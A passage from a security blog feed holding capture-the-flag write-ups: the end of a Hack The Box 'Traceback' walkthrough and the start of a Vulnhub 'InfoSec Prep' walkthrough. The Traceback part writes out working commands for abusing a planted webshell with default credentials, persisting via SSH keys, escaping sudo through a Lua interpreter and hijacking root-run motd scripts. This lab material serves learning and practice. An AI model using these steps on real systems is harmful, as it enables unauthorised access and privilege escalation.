&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Mar 26 04:42:19 2020 -- 1 IP address (1 host up) scanned in 61.23 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The open ports are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;22: SSH&lt;/li&gt;
&lt;li&gt;80: a web server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We do not have any information to connect to the SSH server.&lt;/p&gt;
&lt;p&gt;The website is a simple web page saying that the website has been hacked and
that a backdoor is available for the net.&lt;/p&gt;
&lt;p&gt;Running a &lt;code&gt;dirb&lt;/code&gt; or other web fuzzing tool doesn't give any result.&lt;/p&gt;
&lt;p&gt;&lt;img alt="homepage" src="/media/2020.08/traceback_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Looking at the source code we found a commentary in the body: "Some of the best
web shells that you might need".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;This site has been owned&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h3&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; - Xh4H - &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h3&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="cm"&gt;&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The comment is the description of a &lt;a href="https://github.com/TheBinitGhimire/Web-Shells"&gt;github repository containing
webshell&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We generate a wordlist from the webshell of this repository and launch it
against the website with &lt;a href="https://github.com/ffuf/ffuf"&gt;ffuf&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./ffuf -w ~/htb_traceback/Web-Shells/list -u http://10.10.10.181/FUZZ -mc 200 -c -v&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\&lt;/span&gt;
&lt;span class="code-line"&gt;      /\ \__/ /\ \__/  __  __  /\ \__/&lt;/span&gt;
&lt;span class="code-line"&gt;      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&lt;/span&gt;
&lt;span class="code-line"&gt;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&lt;/span&gt;
&lt;span class="code-line"&gt;        \ \_\   \ \_\  \ \____/  \ \_\&lt;/span&gt;
&lt;span class="code-line"&gt;          \/_/    \/_/   \/___/    \/_/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      v1.0.2&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;:: Method           : GET&lt;/span&gt;
&lt;span class="code-line"&gt;:: URL              : http://10.10.10.181/FUZZ&lt;/span&gt;
&lt;span class="code-line"&gt;:: Follow redirects : false&lt;/span&gt;
&lt;span class="code-line"&gt;:: Calibration      : false&lt;/span&gt;
&lt;span class="code-line"&gt;:: Timeout          : 10&lt;/span&gt;
&lt;span class="code-line"&gt;:: Threads          : 40&lt;/span&gt;
&lt;span class="code-line"&gt;:: Matcher          : Response status: 200&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;| URL | http://10.10.10.181/smevk.php&lt;/span&gt;
&lt;span class="code-line"&gt;    * FUZZ: smevk.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go to the webshell page and found an authentication form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="webshell homepage" src="/media/2020.08/traceback_02.png"&gt;&lt;/p&gt;
&lt;p&gt;According to Github the default credentials are "admin:admin". Once log id we
can see a few interesting information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We are the user webadmin&lt;/li&gt;
&lt;li&gt;Our id is &lt;code&gt;1000&lt;/code&gt; which mean we are a system user&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="webshell homepage" src="/media/2020.08/traceback_03.png"&gt;&lt;/p&gt;
&lt;p&gt;We change directory for &lt;code&gt;/home/webadmin/&lt;/code&gt;. We see that there is a
&lt;code&gt;.ssh/authorized_keys&lt;/code&gt; file (maybe you need to create it if this doesn't exist,
as I used the public server the folder and the file already existed).
We add our public ssh key to the file and connect using ssh.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh 10.10.10.181 -lwebadmin&lt;/span&gt;
&lt;span class="code-line"&gt;The authenticity of host &amp;#39;10.10.10.181 (10.10.10.181)&amp;#39; can&amp;#39;t be established.&lt;/span&gt;
&lt;span class="code-line"&gt;ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.&lt;/span&gt;
&lt;span class="code-line"&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Permanently added &amp;#39;10.10.10.181&amp;#39; (ECDSA) to the list of known hosts.&lt;/span&gt;
&lt;span class="code-line"&gt;#################################&lt;/span&gt;
&lt;span class="code-line"&gt;-------- OWNED BY XH4H  ---------&lt;/span&gt;
&lt;span class="code-line"&gt;- I guess stuff could have been configured better ^^ -&lt;/span&gt;
&lt;span class="code-line"&gt;#################################&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Xh4H land&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Thu Mar 26 01:09:32 2020 from 10.10.17.253&lt;/span&gt;
&lt;span class="code-line"&gt;webadmin@traceback:~$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;p&gt;In our home folder we found a note from &lt;code&gt;sysadmin&lt;/code&gt;, the other system user about
some lua tool.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ cat note.txt&lt;/span&gt;
&lt;span class="code-line"&gt;- sysadmin -&lt;/span&gt;
&lt;span class="code-line"&gt;I have left a tool to practice Lua.&lt;/span&gt;
&lt;span class="code-line"&gt;I&amp;#39;m sure you know where to find it.&lt;/span&gt;
&lt;span class="code-line"&gt;Contact me if you have any question.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking at our &lt;code&gt;sudo&lt;/code&gt; right we have the possibility to execute &lt;code&gt;luvit&lt;/code&gt; as
&lt;code&gt;sysadmin&lt;/code&gt; without password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for webadmin on traceback:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User webadmin may run the following commands on traceback:&lt;/span&gt;
&lt;span class="code-line"&gt;    (sysadmin) NOPASSWD: /home/sysadmin/luvit&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We deduce that this is a lua interpreter and run some "Hello World" to confirm
it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit &lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to the Luvit repl!&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; print(&amp;quot;Hello World&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;Hello World&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next we just execute &lt;code&gt;/bin/sh&lt;/code&gt; using our interpreter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &amp;#39;os.execute(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go to our new home directory and read &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ bash&lt;/span&gt;
&lt;span class="code-line"&gt;sysadmin@traceback:~$ cd /home/sysadmin/&lt;/span&gt;
&lt;span class="code-line"&gt;sysadmin@traceback:/home/sysadmin$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;luvit  user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;sysadmin@traceback:/home/sysadmin$ cat user.txt &lt;/span&gt;
&lt;span class="code-line"&gt;349f0968dce655cb15708bba0077d225&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As before we add our public ssh key to the user's &lt;code&gt;.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id="root"&gt;root&lt;/h1&gt;
&lt;p&gt;We do not know sysadmin's password required to list our &lt;code&gt;sudo&lt;/code&gt; right.&lt;/p&gt;
&lt;p&gt;We run a simple &lt;code&gt;ps aux&lt;/code&gt; to know which process are running. We see (that's some
luck) that root regularly execute the following command:
&lt;code&gt;/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root      28855  0.0  0.0   4628   856 ?        Ss   02:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We confirm that using &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; (using ssh
to copy the binary).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;2020/03/26 03:07:01 CMD: UID=0    PID=29213  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ &lt;/span&gt;
&lt;span class="code-line"&gt;2020/03/26 03:07:01 CMD: UID=0    PID=29212  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When looking at the &lt;code&gt;/var/backups/.update-motd.d&lt;/code&gt; folder's permissions when see
that we can not write in any file nor create a file as everything belong to
&lt;code&gt;root&lt;/code&gt;. Nevertheless, the &lt;code&gt;/etc/update-motd.d/&lt;/code&gt; folder's permissions allow our
user to write in any file. We create a temporary folder and add a command to the
&lt;code&gt;00-header&lt;/code&gt; file. That command will copy the file &lt;code&gt;/root/root.txt&lt;/code&gt; and give us
the permissions to read it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d$ ls -al&lt;/span&gt;
&lt;span class="code-line"&gt;total 32&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  981 Mar 26 03:59 00-header&lt;/span&gt;
&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  982 Mar 26 03:59 10-help-text&lt;/span&gt;
&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin 4264 Mar 26 03:59 50-motd-news&lt;/span&gt;
&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  604 Mar 26 03:59 80-esm&lt;/span&gt;
&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  299 Mar 26 03:59 91-release-upgrade&lt;/span&gt;
&lt;span class="code-line"&gt;sysadmin@traceback:/etc/update-motd.d$ mkdir /tmp/ioio&lt;/span&gt;
&lt;span class="code-line"&gt;sysadmin@traceback:/etc/update-motd.d$ echo &amp;#39;cp /root/root.txt /tmp/ioio &amp;amp;&amp;amp; chmod 777 /tmp/ioio/root.txt&amp;#39; &amp;gt;&amp;gt; 00-header&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then quickly trigger the command by initiating a new SSH connection. We can
then grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh sysadmin@10.10.10.181&lt;/span&gt;
&lt;span class="code-line"&gt;#################################&lt;/span&gt;
&lt;span class="code-line"&gt;-------- OWNED BY XH4H  ---------&lt;/span&gt;
&lt;span class="code-line"&gt;- I guess stuff could have been configured better ^^ -&lt;/span&gt;
&lt;span class="code-line"&gt;#################################&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Xh4H land&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Thu Mar 26 03:57:28 2020 from 10.10.14.2&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat /tmp/ioio/*&lt;/span&gt;
&lt;span class="code-line"&gt;07c8a04e829b07060576e3a799a33a9d&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The box was quit easy and is really a nice one for beginner.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category></entry><entry><title>Vulnhub: InfoSec Prep: OSCP</title><link href="https://maggick.fr/2020/08/vulnhub-infosec-prep-oscp.html" rel="alternate"></link><published>2020-08-10T10:35:00+02:00</published><updated>2020-08-10T10:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-10:/2020/08/vulnhub-infosec-prep-oscp.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.08/prep_oscp.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a vulnhub machine
&lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/"&gt;InfoSec Prep&lt;/a&gt;
This box is an really easy box in order to make a small selection for entering a
give away for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.
The box was created by
&lt;a href="https://www.vulnhub.com/author/falconspy,646/"&gt;FalconSpy&lt;/a&gt; and publish on July
11 2020.
It involves a &lt;code&gt;robots.txt&lt;/code&gt; file, some base64 an SSH key, lxd and a SUID binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/prep_oscp.png" alt="Book card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a vulnhub machine
&lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/"&gt;InfoSec Prep&lt;/a&gt;
This box is an really easy box in order to make a small selection for entering a
give away for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.
The box was created by
&lt;a href="https://www.vulnhub.com/author/falconspy,646/"&gt;FalconSpy&lt;/a&gt; and publish on July
11 2020.
It involves a &lt;code&gt;robots.txt&lt;/code&gt; file, some base64 an SSH key, lxd and a SUID binary.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 33060 (??) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 18 04:31:34 2020 as: nmap -p- -sSV -oN nmap_tcp 192.168.1.200&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for oscp.home (192.168.1.200)&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.00093s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;33060/tcp open  mysqlx?&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port33060-TCP:V=7.80%I=7%D=7/17%Time=5F1161EE%P=x86_64-pc-linux-gnu%r(N&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ULL,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(GenericLines,9,&amp;quot;\x05\0\0\0\x0b\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x08\x05\x1a\0&amp;quot;)%r(GetRequest,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(HTTPOp&lt;/span&gt;
&lt;span class="code-line"&gt;SF:tions,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(RTSPRequest,9,&amp;quot;\x05\0\0\0\x0b&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x08\x05\x1a\0&amp;quot;)%r(RPCCheck,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(DNSVers&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ionBindReqTCP,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(DNSStatusRequestTCP,2&lt;/span&gt;
&lt;span class="code-line"&gt;SF:B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fI&lt;/span&gt;
&lt;span class="code-line"&gt;SF:nvalid\x20message\&amp;quot;\x05HY000&amp;quot;)%r(Help,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;SF:%r(SSLSessionReq,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY000&amp;quot;)%r(TerminalServerCookie&lt;/span&gt;
&lt;span class="code-line"&gt;SF:,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(TLSSessionReq,2B,&amp;quot;\x05\0\0\0\x0b\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x05HY000&amp;quot;)%r(Kerberos,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(SMBProgNeg,9&lt;/span&gt;
&lt;span class="code-line"&gt;SF:,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(X11Probe,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:00&amp;quot;)%r(FourOhFourRequest,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LPDString,&lt;/span&gt;
&lt;span class="code-line"&gt;SF:9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LDAPSearchReq,2B,&amp;quot;\x05\0\0\0\x0b\x0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x05HY000&amp;quot;)%r(LDAPBindReq,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(SIPOptions&lt;/span&gt;
&lt;span class="code-line"&gt;SF:,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LANDesk-RC,9,&amp;quot;\x05\0\0\0\x0b\x08\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:05\x1a\0&amp;quot;)%r(TerminalServer,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(NCP,9,&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(NotesRPC,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1&lt;/span&gt;
&lt;span class="code-line"&gt;SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY000&lt;/span&gt;
&lt;span class="code-line"&gt;SF:&amp;quot;)%r(JavaRMI,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(WMSRequest,9,&amp;quot;\x05\0\0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\0\x0b\x08\x05\x1a\0&amp;quot;)%r(oracle-tns,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r&lt;/span&gt;
&lt;span class="code-line"&gt;SF:(ms-sql-s,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(afp,2B,&amp;quot;\x05\0\0\0\x0b\x0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x05HY000&amp;quot;)%r(giop,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;On port 80 we found a classic wordpress blog. We run a wpscan on it but nothing
pop out. We run a nikto on the box. It found an entry &lt;code&gt;/secret.txt&lt;/code&gt; on the
&lt;code&gt;robots.txt&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nikto -h 192.168.1.200&lt;/span&gt;
&lt;span class="code-line"&gt;- Nikto v2.1.6&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target IP:          192.168.1.200&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target Hostname:    192.168.1.200&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target Port:        80&lt;/span&gt;
&lt;span class="code-line"&gt;+ Start Time:         2020-07-18 08:12:31 (GMT-4)&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;+ Server: Apache/2.4.41 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;+ RFC-1918 IP address found in the &amp;#39;link&amp;#39; header. The IP is &amp;quot;10.244.168.1&amp;quot;.&lt;/span&gt;
&lt;span class="code-line"&gt;+ The anti-clickjacking X-Frame-Options header is not present.&lt;/span&gt;
&lt;span class="code-line"&gt;+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/span&gt;
&lt;span class="code-line"&gt;+ Uncommon header &amp;#39;link&amp;#39; found, with contents: &amp;lt;http://192.168.1.200http://10.244.168.1/index.php/wp-json/&amp;gt;; rel=&amp;quot;https://api.w.org/&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/span&gt;
&lt;span class="code-line"&gt;+ Uncommon header &amp;#39;x-redirect-by&amp;#39; found, with contents: WordPress&lt;/span&gt;
&lt;span class="code-line"&gt;+ No CGI Directories found (use &amp;#39;-C all&amp;#39; to force check all possible dirs)&lt;/span&gt;
&lt;span class="code-line"&gt;+ Entry &amp;#39;/secret.txt&amp;#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)&lt;/span&gt;
&lt;span class="code-line"&gt;+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The file is a RSA private key encoded in base64. Once decoded we store it in a
&lt;code&gt;ssh_key&lt;/code&gt; file.&lt;/p&gt;
